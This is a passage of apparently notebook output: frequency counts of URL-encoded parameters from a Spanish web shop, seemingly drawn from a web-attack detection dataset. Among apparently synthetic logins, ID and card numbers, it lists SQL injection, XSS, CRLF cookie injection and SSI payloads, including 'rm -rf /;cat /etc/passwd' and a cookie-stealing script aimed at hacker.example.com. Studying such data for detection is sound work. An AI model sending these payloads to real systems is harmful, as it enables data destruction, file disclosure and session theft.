       " 'pwd=5ra0sf873ismo': 2,\n",
       " 'login=de_crist': 2,\n",
       " 'pwd=acontec%27imie%2Cnto': 1,\n",
       " 'id=1%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 2,\n",
       " 'errorMsg=%27+DELETE+FROM+USERS': 8,\n",
       " 'precio=7924': 2,\n",
       " 'modo=registro%27+AND+%271%27%3D%271': 1,\n",
       " 'login=schnaith': 3,\n",
       " 'password=73i29l9t79o': 3,\n",
       " 'nombre=Rosal%ED': 3,\n",
       " 'apellidos=Manetti+Domene': 3,\n",
       " 'email=mao-ying-mehaffey%40viscotek.md': 3,\n",
       " 'dni=60465875W': 3,\n",
       " 'direccion=Xarlengo%2C+25%2C+8-A': 3,\n",
       " 'ciudad=Arico': 2,\n",
       " 'cp=46613': 3,\n",
       " 'provincia=Palencia': 94,\n",
       " 'ntc=3013931042321034': 2,\n",
       " 'ntc=879303512199884A': 1,\n",
       " 'ciudadA=Arico': 1,\n",
       " 'login=edlin4': 3,\n",
       " 'password=5oy6nte': 2,\n",
       " 'nombre=Ralston': 5,\n",
       " 'apellidos=Pe%F1afiel': 6,\n",
       " 'email=valente.oray%40enlapalma.com.sh': 3,\n",
       " 'dni=91076650P': 3,\n",
       " 'direccion=Publicista+Jose+Alegria+156+': 3,\n",
       " 'ciudad=Alhambra': 3,\n",
       " 'cp=09109': 3,\n",
       " 'provincia=Cuenca': 68,\n",
       " 'ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org': 3,\n",
       " 'password=9%2Fp5t2r%277pia': 1,\n",
       " 'ntc=2136567392890327': 1,\n",
       " 'ntcA=2136567392890327': 1,\n",
       " 'precio=39+': 1,\n",
       " 'cantidad=69': 20,\n",
       " 'id=1%2F': 45,\n",
       " 'modo=entrarAND+1%3D1': 1,\n",
       " 'login=raymund': 3,\n",
       " 'pwd=pist%F3n': 3,\n",
       " 'B1=%253F': 7,\n",
       " 'pwd=%2Cc%27oraje': 1,\n",
       " 'loginA=raymund': 1,\n",
       " 'id=2%253F': 4,\n",
       " 'precio=1754%22+AND+%221%22%3D%221': 1,\n",
       " 'precio=1754': 1,\n",
       " 'precioA=1754': 1,\n",
       " 'login=damiano': 2,\n",
       " 'password=EsCoGiDAMeNte': 2,\n",
       " 'nombre=Vilmar': 2,\n",
       " 'apellidos=Mateu+Bernaus': 4,\n",
       " 'email=sheybal%40cirugiaparpado.no': 2,\n",
       " 'dni=75586196P': 2,\n",
       " 'direccion=Travesia+Nardo+124%2C+7E': 2,\n",
       " 'ciudad=Torre+de%2F+Mi*guel+Sesmer%2Bo': 1,\n",
       " 'cp=42311': 5,\n",
       " 'provincia=C%E1ceres': 55,\n",
       " 'ntc=6955835443751937': 1,\n",
       " 'ciudad=Talav%E1n': 1,\n",
       " 'ntcA=6955835443751937': 1,\n",
       " 'B2=Vaciar+carrito%257C': 7,\n",
       " 'B2=%4040': 5,\n",
       " 'login=sawyers': 3,\n",
       " 'password=encUmb2ad3%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 1,\n",
       " 'nombre=Max': 3,\n",
       " 'apellidos=Sj%F6strand+Ampurias': 1,\n",
       " 'email=tamburi%40hispadis.ar': 3,\n",
       " 'dni=30293636Z': 3,\n",
       " 'direccion=C%2F+Virgen+De+Las+Angustias+122+4%3FA': 3,\n",
       " 'ciudad=Fuentespina': 3,\n",
       " 'cp=48220': 8,\n",
       " 'ntc=8898020239162472': 3,\n",
       " 'password=encUmb2ad3': 2,\n",
       " 'apellidos=Ve%2Crjaga+Figarola': 1,\n",
       " 'apellidosA=Sj%F6strand+Ampurias': 1,\n",
       " 'cantidad=68': 15,\n",
       " 'precioA=39': 31,\n",
       " 'login=x%3Fuan8': 1,\n",
       " 'pwd=pringoso': 2,\n",
       " 'loginA=byran': 1,\n",
       " 'id=1+': 6,\n",
       " 'errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 5,\n",
       " 'errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 8,\n",
       " 'modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 5,\n",
       " 'precio=4762': 2,\n",
       " 'precioA=4762': 1,\n",
       " 'login=pubs': 3,\n",
       " 'password=+': 3,\n",
       " 'nombre=Juana+del+Pilar': 9,\n",
       " 'apellidos=Arias+Salavedra': 3,\n",
       " 'email=keefer-claudio%40hipermadrid.kr': 3,\n",
       " 'dni=24987514S': 4,\n",
       " 'direccion=Nucleo+Residencial+San+Carlos%2C+5%2C+3%3FH': 6,\n",
       " 'ciudad=Alba+de+Tormes': 3,\n",
       " 'cp=22896': 3,\n",
       " 'provincia=Castell%F3n': 24,\n",
       " 'ntc=2643686847847582': 2,\n",
       " 'password=MIsa9tr%D3PicA': 2,\n",
       " 'dni=183A74311': 1,\n",
       " 'ntcA=2643686847847582': 1,\n",
       " 'B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 6,\n",
       " 'login=griggs3': 2,\n",
       " 'password=49TO9El0': 2,\n",
       " 'nombre=Emanuel': 8,\n",
       " 'apellidos=Zinicola+Cucurella': 2,\n",
       " 'email=bergman%40pintandomucho.la': 1,\n",
       " 'dni=20437771V': 2,\n",
       " 'direccion=Calle+Fray+Lu*is+De+Leon+119+': 1,\n",
       " 'ciudad=Calcena': 2,\n",
       " 'cp=03580': 2,\n",
       " 'ntc=4946393543787658': 2,\n",
       " 'emailA=bergman%40pintandomucho.la': 1,\n",
       " 'direccion=Buen+Lugar+69+6%3FF': 1,\n",
       " 'precio=85%2B': 1,\n",
       " 'id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org': 11,\n",
       " 'login=flaherty': 2,\n",
       " 'pwd=j%2Baqu%E9s': 3,\n",
       " 'remember=%2B': 1,\n",
       " 'login=de%3F-anna': 1,\n",
       " 'B1A=Entrar': 93,\n",
       " 'id=1any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 1,\n",
       " 'id=%7C': 7,\n",
       " 'precio=623%4040': 1,\n",
       " 'precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E': 3,\n",
       " 'precio=623': 4,\n",
       " 'login=zug': 2,\n",
       " 'password=alternaci-59': 3,\n",
       " 'nombre=Manel%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'apellidos=Llimes': 2,\n",
       " 'email=partridge%40tamarit.com.gs': 2,\n",
       " 'dni=23404560J': 2,\n",
       " 'direccion=Camino+Uba%2C+121%2C+': 2,\n",
       " 'ciudad=Art%E9s': 2,\n",
       " 'cp=06892': 2,\n",
       " 'provincia=Toledo': 48,\n",
       " 'ntc=5728967696273314': 2,\n",
       " 'nombre=Manel': 4,\n",
       " 'provinciaA=Toledo': 2,\n",
       " 'B2=Vaciar+carrito%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 3,\n",
       " 'login=jeanloui': 3,\n",
       " 'password=remosquearse': 2,\n",
       " 'nombre=Evelio': 3,\n",
       " 'apellidos=Fonfria+Castillero': 3,\n",
       " 'email=sprerris-apfel%40tresbrujas.bn': 3,\n",
       " 'dni=89061921X': 6,\n",
       " 'direccion=C%2F+Cervantes+117%2C+10%3FG': 3,\n",
       " 'ciudad=%DArbel+del+Castillo%27OR%27a%3D%27a': 1,\n",
       " 'cp=50343': 6,\n",
       " 'ntc=9895940721818753': 3,\n",
       " 'password=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 2,\n",
       " 'ciudad=%DArbel+del+Castillo': 4,\n",
       " 'ciudad=Villafranca+%2Fdel+Campo': 1,\n",
       " 'cantidad=28': 19,\n",
       " 'pwd=815ja4': 1,\n",
       " 'login=tammy5': 2,\n",
       " 'pwd=forzam%27ie%2Fn%2Fto': 1,\n",
       " 'pwdA=815ja4': 1,\n",
       " 'id=1%2B': 7,\n",
       " 'errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 4,\n",
       " 'precio=37': 2,\n",
       " 'login=pezzullo': 2,\n",
       " 'password=3s3LAVo3%EDa': 2,\n",
       " 'nombre=Cipriana': 5,\n",
       " 'apellidos=Maza+de+Lizana+Busqueta': 2,\n",
       " 'email=%2520': 2,\n",
       " 'dni=86251880V': 6,\n",
       " 'direccion=Calle+Nuria%2C+8%2C+': 2,\n",
       " 'ciudad=Castrillo-Tejeriego': 4,\n",
       " 'cp=29715': 1,\n",
       " 'ntc=7846720837144073': 2,\n",
       " 'email=verstraete2%40soyouthinkyoucandance.io': 1,\n",
       " 'cp=0913A': 1,\n",
       " 'B2=Vaciar+carrito%27OR%27a%3D%27a': 5,\n",
       " 'B2=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E': 6,\n",
       " 'login=gib': 4,\n",
       " 'password=3L29stRE%27OR%27a%3D%27a': 1,\n",
       " 'nombre=Yarav%ED': 4,\n",
       " 'apellidos=Pa%F1ella+Villasev': 4,\n",
       " 'email=switzer%40grandesinventos.pt': 4,\n",
       " 'dni=04831932T': 4,\n",
       " 'direccion=C%2F+Rio+San+Lorenzo%2C+125%2C+10%3FC': 4,\n",
       " 'ciudad=Alegr%EDa-Dulantzi': 3,\n",
       " 'cp=34170': 4,\n",
       " 'ntc=3029147558638309': 4,\n",
       " 'password=3L29stRE': 2,\n",
       " 'provincia=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 2,\n",
       " 'password=2%2Cu%2F%2F4ro08': 1,\n",
       " 'ciudadA=Alegr%EDa-Dulantzi': 1,\n",
       " 'nombre=Ques%2Bo+Manchego': 56,\n",
       " 'cantidad=10': 2,\n",
       " 'login=fargo': 2,\n",
       " 'pwd=engolfa': 2,\n",
       " 'remember=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 3,\n",
       " 'id=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 10,\n",
       " 'errorMsg=Credenciales+incorrectas%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 8,\n",
       " 'precio=7641': 3,\n",
       " 'login=hatty': 3,\n",
       " 'password=eb%FArnea': 3,\n",
       " 'nombre=Norberto': 3,\n",
       " 'apellidos=Riu+Riutort': 6,\n",
       " 'email=demjanenko%40gesautonomos.io': 5,\n",
       " 'dni=48139097M': 2,\n",
       " 'direccion=Cipriano+De+La+Huerga%2C+45+': 3,\n",
       " 'ciudad=Fontiveros': 6,\n",
       " 'cp=05146%253F': 1,\n",
       " 'provincia=Baleares+%28Illes%29': 22,\n",
       " 'ntc=6216263942492348': 3,\n",
       " 'dni=33A75810Q': 1,\n",
       " 'cp=05146': 2,\n",
       " 'provinciaA=Baleares+%28Illes%29': 2,\n",
       " 'modo=registro+': 2,\n",
       " 'login=knudsen': 3,\n",
       " 'password=2u6sidi7': 3,\n",
       " 'nombre=Arist%F3cles': 3,\n",
       " 'apellidos=Figueras+Boado': 2,\n",
       " 'email=dreese_teter0%40promotorareina.sg': 3,\n",
       " 'dni=46079208L': 3,\n",
       " 'direccion=Carrer+Ildefons+Cerda+160+': 3,\n",
       " 'ciudad=Regueras%2C+Las': 6,\n",
       " 'cp=40152': 5,\n",
       " 'ntc=2561301894117628': 3,\n",
       " 'provincia=V%2Balladolid': 1,\n",
       " 'apellidosA=Figueras+Boado': 1,\n",
       " 'nombre=Queso+Manchego%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 2,\n",
       " 'cantidad=2': 13,\n",
       " 'precio=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 5,\n",
       " 'cantidadA=2': 1,\n",
       " 'modo=entrarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2': 3,\n",
       " 'login=odele': 2,\n",
       " 'pwd=19ler8z6r': 2,\n",
       " 'login=cari%3Ftta': 1,\n",
       " 'pwdA=19ler8z6r': 1,\n",
       " 'errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F': 5,\n",
       " 'modo=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 5,\n",
       " 'precio=291': 3,\n",
       " 'login=thac': 2,\n",
       " 'password=crIn%2BAda': 4,\n",
       " 'nombre=Aliberta': 4,\n",
       " 'apellidos=Gochez': 13,\n",
       " 'email=kubler5%40porqueagel.ps': 4,\n",
       " 'dni=49372725M': 9,\n",
       " 'direccion=Calle+Barrio+De+La+Torre+163%2C+': 4,\n",
       " 'ciudad=Alar+del+Rey': 4,\n",
       " 'cp=22770%2B': 1,\n",
       " 'ntc=5546440906293369': 4,\n",
       " 'cp=22770': 3,\n",
       " 'provincia=%2FC%E1*cere*s': 1,\n",
       " 'loginA=thac': 1,\n",
       " 'login=beadley': 2,\n",
       " 'password=colp-e': 2,\n",
       " 'nombre=Clemencio': 2,\n",
       " 'apellidos=Marlasca': 2,\n",
       " 'email=adrian%40espanolynegocios.id': 2,\n",
       " 'dni=07319581S': 2,\n",
       " 'direccion=Barrio+Rucandial+165%2C+': 1,\n",
       " 'ciudad=Pesaguero': 2,\n",
       " 'cp=10320': 9,\n",
       " 'provincia=Sevilla': 19,\n",
       " 'ntc=1559596001370205': 2,\n",
       " 'B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2': 11,\n",
       " 'direccionA=Barrio+Rucandial+165%2C+': 1,\n",
       " 'nombre=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29': 1,\n",
       " 'cantidad=46': 12,\n",
       " 'precioA=100': 24,\n",
       " 'login=mast%2Ben%2Cbr': 1,\n",
       " 'pwd=7T3c484': 2,\n",
       " 'login=parisen': 1,\n",
       " 'errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2': 11,\n",
       " 'precio=3833': 1,\n",
       " 'login=maurice': 3,\n",
       " 'password=a5l3ndi1': 3,\n",
       " 'nombre=Daner': 3,\n",
       " 'apellidos=Olivos+Ball%FAs': 2,\n",
       " 'email=cassini-igawa%40alcantarapartners.es': 3,\n",
       " 'dni=56405919Y': 7,\n",
       " 'direccion=Practicante+Cristobal++Benitez+160%2C+11%3FC': 3,\n",
       " 'ciudad=San+Juan+del+Puerto': 3,\n",
       " 'cp=49148': 3,\n",
       " 'ntc=9851892046707743%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E': 1,\n",
       " 'provincia=Va*l%3Fladolid': 1,\n",
       " 'ntc=9851892046707743': 2,\n",
       " 'apellidosA=Olivos+Ball%FAs': 1,\n",
       " 'B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 6,\n",
       " 'login=richards': 4,\n",
       " 'password=v0r7fica6i24': 4,\n",
       " 'nombre=Patricio': 3,\n",
       " 'apellidos=De+Sol%E0+Butticazany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 1,\n",
       " 'email=junior%40esteticadayda.bo': 4,\n",
       " 'dni=75911188X': 3,\n",
       " 'direccion=C%2F+Candeleria+179%2C+': 4,\n",
       " 'ciudad=Sant+Miquel+de+Fluvi%E0': 4,\n",
       " 'cp=13100': 6,\n",
       " 'provincia=Valladolid': 76,\n",
       " 'ntc=5101892686215961': 4,\n",
       " 'apellidos=De+Sol%E0+Butticaz': 2,\n",
       " 'dni=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 2,\n",
       " 'apellidos=Sotelo-+As.torga': 1,\n",
       " 'nombreA=Patricio': 1,\n",
       " 'cantidad=8': 7,\n",
       " 'B1=%2500': 7,\n",
       " 'cantidadA=8': 1,\n",
       " 'login=dadang%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'pwd=6a1er87': 2,\n",
       " 'login=dadang': 2,\n",
       " 'pwd=mo%2Fn2ep%2F%EDo': 1,\n",
       " 'errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E': 5,\n",
       " 'precio=6801': 2,\n",
       " 'B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 7,\n",
       " 'precioA=6801': 1,\n",
       " 'login=sabadash': 2,\n",
       " 'password=gurullada': 3,\n",
       " 'nombre=Sergio': 4,\n",
       " 'apellidos=Dinardi+Compres': 5,\n",
       " 'email=wences.seigner%40aldufa.es': 3,\n",
       " 'dni=92012174F': 3,\n",
       " 'direccion=Valldemosa%2C+129+4H': 2,\n",
       " 'ciudad=Frumales': 3,\n",
       " 'cp=19490': 5,\n",
       " 'provincia=Valencia': 79,\n",
       " 'ntc=5024784015351535%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E': 1,\n",
       " 'direccion=C%2F+Z*abal*%2Bburu%2C+71%2C+': 1,\n",
       " 'ntc=5024784015351535': 5,\n",
       " 'loginA=sabadash': 1,\n",
       " 'B2=%27+DELETE+FROM+USERS': 4,\n",
       " 'login=thege': 3,\n",
       " 'password=abstruso%2500': 1,\n",
       " 'nombre=Guida': 4,\n",
       " 'apellidos=Lambarri': 3,\n",
       " 'email=mcclellan.truex%40faders.com.cl': 3,\n",
       " 'dni=62140654J': 3,\n",
       " 'direccion=Txapitela%2C+183+13%3FG': 3,\n",
       " 'ciudad=Sant+Feliu+Sasserra': 2,\n",
       " 'cp=04569': 2,\n",
       " 'ntc=1284694854341650': 3,\n",
       " 'password=abstruso': 2,\n",
       " 'ciudad=Man%2Btin*os': 1,\n",
       " 'cpA=04569': 1,\n",
       " 'nombre=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 3,\n",
       " 'cantidad=15': 16,\n",
       " 'precio=39%2F': 56,\n",
       " 'login=%2Bshinji': 1,\n",
       " 'pwd=4I8f0': 2,\n",
       " 'login=chiquia0': 2,\n",
       " 'id=%2500': 5,\n",
       " 'precio=4639': 4,\n",
       " 'B1=Confirmar%2500': 1,\n",
       " 'B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 6,\n",
       " 'login=strauss': 3,\n",
       " 'password=manirrota': 3,\n",
       " 'nombre=Dania': 3,\n",
       " 'apellidos=Cucurull+Forn%27INJECTED_PARAM': 1,\n",
       " 'email=everrett%40fernandosoto.zr': 6,\n",
       " 'dni=34016342D': 3,\n",
       " 'direccion=Doctor+Gomez+Ulla%2C+7+13B': 3,\n",
       " 'ciudad=Boada+de+Campos': 3,\n",
       " 'cp=45573': 3,\n",
       " 'ntc=9293437709151698': 3,\n",
       " 'apellidos=Alc%E1ce.%2Br': 1,\n",
       " 'apellidos=Cucurull+Forn': 1,\n",
       " 'B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 5,\n",
       " 'login=amar': 3,\n",
       " 'password=encallecer': 3,\n",
       " 'nombre=Celedonio': 3,\n",
       " 'apellidos=Compres+Manau': 3,\n",
       " 'email=danielson%40bloodline.mc': 3,\n",
       " 'dni=45415076N': 2,\n",
       " 'direccion=Valladolid%2C+99+7A%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 1,\n",
       " 'ciudad=Borges+del+Camp%2C+Les': 7,\n",
       " 'ntc=1817134739036015': 3,\n",
       " 'direccion=Valladolid%2C+99+7A': 2,\n",
       " 'provincia=Salama%2Fnca': 1,\n",
       " 'dniA=45415076N': 1,\n",
       " 'B1=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 5,\n",
       " 'cantidadA=69': 2,\n",
       " 'login=p%2Bap*e': 1,\n",
       " 'pwd=74oNc0': 2,\n",
       " 'loginA=ince': 1,\n",
       " 'errorMsg=%27INJECTED_PARAM': 8,\n",
       " 'precio=3089': 3,\n",
       " 'B1=%7C': 5,\n",
       " 'login=zander': 4,\n",
       " 'password=arca%EDsta': 4,\n",
       " 'nombre=Zain': 4,\n",
       " 'apellidos=Espriella+Morcossessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F': 1,\n",
       " 'email=skala%40lamarsrl.la': 4,\n",
       " 'dni=28264646S': 5,\n",
       " 'direccion=Nardo%2C+106%2C+7-H': 4,\n",
       " 'ciudad=Torrecampo': 3,\n",
       " 'cp=46315': 4,\n",
       " 'provincia=Alicante': 47,\n",
       " 'ntc=5436324330428646': 2,\n",
       " 'apellidos=Espriella+Morcos': 3,\n",
       " 'ciudad=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 2,\n",
       " 'ntc=878731290934670A': 1,\n",
       " 'ntcA=5436324330428646': 1,\n",
       " 'login=chauhan': 2,\n",
       " 'password=%2Brabosea4': 2,\n",
       " 'nombre=Nelma': 11,\n",
       " 'apellidos=Madrera+Ib%E1%F1ez': 1,\n",
       " 'email=drayton%40callalabocaatiaherminia.int': 2,\n",
       " 'dni=71628074W': 3,\n",
       " 'direccion=C%2F+Musico+Juan+De+Encinas+10+8%3FC': 2,\n",
       " 'ciudad=Vilanova+i+la+Geltr%FA': 2,\n",
       " 'cp=48390': 2,\n",
       " 'ntc=1031009266580150': 2,\n",
       " 'B1=Registrar%253F': 1,\n",
       " 'apellidos=J-o.rba+Cl%2Cua': 1,\n",
       " 'precio=%27OR%27a%3D%27a': 3,\n",
       " 'cantidad=84': 23,\n",
       " 'login=lutz': 3,\n",
       " 'pwd=OpimA': 3,\n",
       " 'remember=off%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 1,\n",
       " 'pwd=%27OR%27a%3D%27a': 4,\n",
       " 'loginA=lutz': 1,\n",
       " 'id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 8,\n",
       " 'errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E': 6,\n",
       " 'modo=insertar%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 1,\n",
       " 'precio=8962': 4,\n",
       " 'login=steene': 3,\n",
       " 'password=h3millos6': 3,\n",
       " 'nombre=Monserrat': 3,\n",
       " 'apellidos=Barber%ED': 3,\n",
       " 'email=nachum%40enmenorca.com.ma': 3,\n",
       " 'dni=50805644R': 6,\n",
       " 'direccion=Calle+Due%F1as%2C+60%2C+': 3,\n",
       " 'ciudad=Medrano%4040': 1,\n",
       " 'cp=22439': 6,\n",
       " 'ntc=6147677145944254': 6,\n",
       " 'ciudad=Medrano': 2,\n",
       " 'provincia=Ba%3Fd%3F%3Fajoz': 1,\n",
       " 'login=ploof': 6,\n",
       " 'password=g47d8%F16ador': 3,\n",
       " 'nombre=Virma': 11,\n",
       " 'apellidos=Llarden+Romeu': 3,\n",
       " 'email=bresslau%40altoguadiana.ee': 2,\n",
       " 'dni=31881769C': 3,\n",
       " 'direccion=Calle+Picos+De+Europa%2C+65+1%3FH': 2,\n",
       " 'ciudad=Dehesa+de+Romanos': 3,\n",
       " 'cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E': 2,\n",
       " 'ntc=6103925352151214': 3,\n",
       " 'email=%40ghosh%40venderf%40otografias.ae': 1,\n",
       " 'cp=33870': 2,\n",
       " 'direccionA=Calle+Picos+De+Europa%2C+65+1%3FH': 1,\n",
       " 'cantidad=28%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'precio=85%2F': 50,\n",
       " 'login=ozzy': 2,\n",
       " 'pwd=respuesto': 1,\n",
       " 'pwdA=respuesto': 1,\n",
       " 'errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F': 7,\n",
       " 'precio=%2500': 4,\n",
       " 'precio=5999': 1,\n",
       " 'login=leonerd': 3,\n",
       " 'password=6a6o57a': 4,\n",
       " 'nombre=Christopher': 3,\n",
       " 'apellidos=Silva': 4,\n",
       " 'email=havoc8%40g-audi.eg': 4,\n",
       " 'direccion=C%2F+Miquel+Palomares%2C+73+7%3FC': 4,\n",
       " 'ciudad=Bidegoian': 4,\n",
       " 'cp=16415': 4,\n",
       " 'provincia=Almer%EDa': 38,\n",
       " 'ntc=7329932302042221': 3,\n",
       " 'B1=Registrar%27INJECTED_PARAM': 3,\n",
       " 'nombre=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 2,\n",
       " 'ntc=222921063999579A': 1,\n",
       " 'loginA=leonerd': 1,\n",
       " 'login=herak': 4,\n",
       " 'password=v1373948c6a': 3,\n",
       " 'nombre=Malinda': 6,\n",
       " 'apellidos=Diclo+Ornosa': 4,\n",
       " 'email=schull%40cursosenlaplaya.ro': 4,\n",
       " 'dni=43008564J': 3,\n",
       " 'direccion=Pasaje+Arcillero%2C+177%2C+2%3FG': 4,\n",
       " 'ciudad=Pedrosa+del+Reyany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 1,\n",
       " 'cp=37874': 4,\n",
       " 'ntc=3359754319393302': 7,\n",
       " 'password=Set-cookie%253A%2BTamper%253D1041264011025374727': 3,\n",
       " 'ciudad=Pedrosa+del+Rey': 3,\n",
       " 'dni=A1A28731H': 1,\n",
       " 'ntcA=3359754319393302': 1,\n",
       " 'cantidad=3': 15,\n",
       " 'login=davin%27der': 1,\n",
       " 'pwd=engrE%D1adO': 2,\n",
       " 'loginA=jarzemsk': 1,\n",
       " 'precio=898': 3,\n",
       " 'B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 3,\n",
       " 'modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org': 4,\n",
       " 'precioA=898': 1,\n",
       " 'login=phillie': 1,\n",
       " 'password=0t8r2a1e': 1,\n",
       " 'nombre=Elsio': 4,\n",
       " 'apellidos=Surinyac+Rocamora': 1,\n",
       " 'emailA=jordan%40indusmecortiz.se': 1,\n",
       " 'dni=25966835L': 1,\n",
       " 'direccion=Calle+Pedro+De+Lorenzo+118%2C+1%3FB': 1,\n",
       " 'ciudad=Lizartza': 1,\n",
       " 'cp=48111': 1,\n",
       " 'provincia=La+Rioja': 45,\n",
       " 'ntc=8653006261753746': 1,\n",
       " 'B2=Vaciar+carrito%2520': 7,\n",
       " 'login=etienne%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 1,\n",
       " 'password=ahoga2iz8': 4,\n",
       " 'nombre=Pastora': 7,\n",
       " 'apellidos=Aleu+Alcaide': 4,\n",
       " 'email=gulager-balsan6%40978.dm': 3,\n",
       " 'dni=44544869X': 4,\n",
       " 'direccion=Giuseppe+Micael%2C+174+8-H': 4,\n",
       " 'ciudad=Valdefuentes+del+P%E1ramo': 4,\n",
       " 'cp=06300': 4,\n",
       " 'provincia=Ciudad+Real': 34,\n",
       " 'ntc=5699405800944222': 4,\n",
       " 'login=etienne': 3,\n",
       " 'nombre=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'email=t%40%40sumu%40ra_senghor%40todomodelos.aq': 1,\n",
